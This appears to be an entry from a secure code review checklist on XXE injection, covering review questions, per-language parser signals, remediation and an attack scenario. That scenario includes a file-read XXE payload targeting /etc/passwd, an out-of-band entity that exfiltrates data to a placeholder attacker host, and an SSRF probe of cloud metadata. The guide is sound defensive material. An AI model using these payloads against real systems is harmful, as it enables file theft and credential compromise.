---
id: P41
name: XXE
area: V1 Encoding and Sanitization
refs: ASVS V5.3.x / WSTG-INPV-07 / CS: XML External Entity Prevention
---

# P41 — XXE

## Overview
XML External Entity (XXE) injection occurs when an application parses attacker-controlled XML with a parser that resolves external entities and DTDs **without restriction**. An XML document may declare custom entities (`<!ENTITY foo SYSTEM "file:///etc/passwd">`), and a vulnerable parser will dutifully fetch the referenced resource — a local file, an HTTP URL, or another scheme — and inline its contents into the parsed document. The root cause is always the same: a parser left on its default (or explicitly permissive) configuration is fed user input. XXE is not limited to user-supplied XML files; it also hides inside formats that wrap XML — SOAP bodies, SAML assertions, OOXML/ODF office documents, SVG uploads, RSS/Atom feeds, and `.svg`/`.xml` configuration parsed from untrusted uploads. In modern JSON-first stacks XXE is rarer, but it remains critical wherever any XML parsing path exists.

## What to check
- Does any handler parse XML originating from a request — `Content-Type: text/xml`/`application/xml`/`application/soap+xml` body, an uploaded `.xml`/`.svg`/`.docx`/`.xlsx`/`.odt` file, a SAML response, an RSS/Atom feed, a SOAP service, or a webhook delivering XML?
- Is the parser configured to **disable** DTD processing, external general entities, external parameter entities, and external DTD subset loading? Defaults vary wildly across libraries and versions — verify the actual settings, not the docs.
- Are the features set on the **parser instance actually used**? A hardened factory created but never applied (wrong builder, feature ignored by the impl) is a common bug.
- Does the application resolve XInclude (`<xi:include href="...">`), which is a separate XXE-equivalent vector enabled independently of entity resolution?
- Can the parser fetch remote resources (SSRF-via-XXE)? Even a "safe" local-file read becomes SSRF when `SYSTEM "http://internal/..."` is allowed.
- Are parameter entities (`%foo;`) disabled? They enable the **billion-laughs / quadratic blowup** DoS and out-of-band (OOB) data exfiltration even when general entities appear blocked.
- Is `libxml2`-based parsing relying on the global default that may have been relaxed by another part of the codebase?

## Static signals
Unhardened parser construction / invocation:
- Node: `new DOMParser().parseFromString(xml)` (xmldom) without options; `libxmljs.parseXml(xml)` without `noent:false`/`dtdattr` flags; `xml2js` with `resolveExternals:true` or default; `fast-xml-parser` (safer by default but verify `allowBooleanAttributes`/custom entities)
- Python: `lxml.etree.fromstring(xml)` / `lxml.etree.XMLParser()` without `resolve_entities=False`, `no_network=True`, `dtd_validation=False`; stdlib `xml.dom.minidom`, `xml.sax`, `xml.etree.ElementTree` (defusedxml recommended; stdlib is vulnerable to entity expansion)
- Java: `DocumentBuilderFactory.newInstance()` without `setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)` / `setExpandEntityReferences(false)` / `FEATURE_SECURE_PROCESSING`; `SAXParserFactory`, `XMLInputFactory` (StAX) without `IS_SUPPORTING_EXTERNAL_ENTITIES=false` and `SUPPORT_DTD=false`; `Unmarshaller.unmarshal()` on XSD/XSLT source; JAXB, Xerces defaults
- Go: `encoding/xml` (safer — does not resolve external entities by default) — confirm no custom `Entity` field handling; verify third-party wrappers
- PHP: `libxml_disable_entity_loader(false)` / its removal in PHP 8 (loading now follows per-parser flags); `simplexml_load_string($xml)` or `DOMDocument::loadXML()` without `LIBXML_NOENT` review; `XMLReader`, XSL (`xslt_process`)
- Ruby: `Nokogiri::XML(xml)` / `Nokogiri::XML::Document.parse` without `Nokogiri::XML::ParseOptions::NONET` and `NOENT` review; `REXML::Document.new`

Explicit enabling flags (high-signal):
- `resolveExternals: true`, `noEnt: true`, `expandEntityReferences: true`
- `setExpandEntityReferences(true)`, `IS_SUPPORTING_EXTERNAL_ENTITIES(true)`, `SUPPORT_DTD(true)`
- `XML_PARSE_NOENT`, `XML_PARSE_DTDLOAD`, `XML_PARSE_DTDATTR` libxml2 constants passed
- `LIBXML_NOENT` (PHP), `nonet: false` (Ruby), `dtd_validation=True` (Python)

## False positives
- The application never parses XML — JSON-only APIs with no XML/SVG/SOAP/SAML/Office-document upload path are not exposed. Confirm there is truly no XML endpoint before closing.
- External entities and DTD loading are explicitly disabled on the parser instance actually used (e.g. Java `disallow-doctype-decl=true` + `FEATURE_SECURE_PROCESSING`, Python `defusedxml` / `lxml` with `resolve_entities=False, no_network=True`, PHP `LIBXML_NONET` and no `LIBXML_NOENT`, Java StAX both `SUPPORT_DTD=false` and `IS_SUPPORTING_EXTERNAL_ENTITIES=false`).
- Parser is structurally immune: Go `encoding/xml`, modern `fast-xml-parser`, or .NET `XmlReader` with `DtdProcessing.Prohibit` / `XmlResolver=null`. Still verify the version (some old `fast-xml-parser` builds had entity issues).
- XML comes from a trusted, integrity-protected source (signed and verified before parse) with no user control over content.
- The XML is only **generated** (serialized), never parsed from untrusted input.

## Attack scenario
1. Attacker identifies an endpoint that parses XML — e.g. an SVG avatar upload, a SAML SSO assertion, or a SOAP action.
2. Attacker submits a document declaring an external entity pointing at a sensitive file:
   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
   <root><name>&xxe;</name></root>
   ```
3. The vulnerable parser resolves `&xxe;`, reads `/etc/passwd`, and inlines it into the parsed tree.
4. If the application reflects or logs the parsed value, the attacker reads the file contents directly (classic XXE).
5. If no reflection exists, the attacker pivots to **out-of-band exfiltration** — a parameter entity referencing an attacker-controlled server carrying the file content in a URL or DNS query (`<!ENTITY % exfil SYSTEM "http://attacker/?d=%file;">`), or to **SSRF** by pointing `SYSTEM` at an internal metadata endpoint (`http://169.254.169.254/latest/meta-data/`).
6. A billion-laughs entity expansion can also crash the process (DoS) regardless of data exposure.

## Impact
- **Confidentiality**: arbitrary local-file read (config, secrets, private keys, `/etc/passwd`, source code), and SSRF into internal services / cloud metadata (IAM credential theft).
- **Integrity**: limited direct write, but SSRF can drive internal admin actions; parsed content may poison caches or downstream processing.
- **Availability**: billion-laughs / quadratic-blowup entity expansion causes CPU/memory exhaustion and denial of service.
- Severity ranges from High (file disclosure, SSRF) to Critical (cloud-metadata IAM credential theft → full account compromise).

## Remediation
Disable DTDs and external entity resolution on every untrusted-input parser, explicitly and per-instance:
```ts
// VULNERABLE — default DOMParser resolves external entities
import { DOMParser } from '@xmldom/xmldom';
const doc = new DOMParser().parseFromString(req.body);

// SAFE — disallow DOCTYPE/entities (use a hardened lib or defused equivalent)
import saxophone from 'saxophone'; // or a parser with no entity support
// Prefer: validate against a strict schema and use a parser that ignores DTDs entirely.
```
```py
# VULNERABLE
from lxml import etree
root = etree.fromstring(user_xml)

# SAFE
from defusedxml import lxml as dlxml   # or lxml with a hardened parser
parser = etree.XMLParser(resolve_entities=False, no_network=True,
                         dtd_validation=False, load_dtd=False)
root = dlxml.fromstring(user_xml, parser=parser)
```
As defense-in-depth, also reject documents containing `<!DOCTYPE`/`<!ENTITY` at the edge, parse with a streaming/non-entity-aware parser where possible, and keep `libxml2`/JVM parser versions patched (XXE mitigations and defaults change between versions).

## References
- OWASP ASVS V5.3.x — Input validation and injection prevention
- OWASP WSTG-INPV-07 — Testing for XML Injection / XXE
- OWASP Cheat Sheet: XML External Entity Prevention
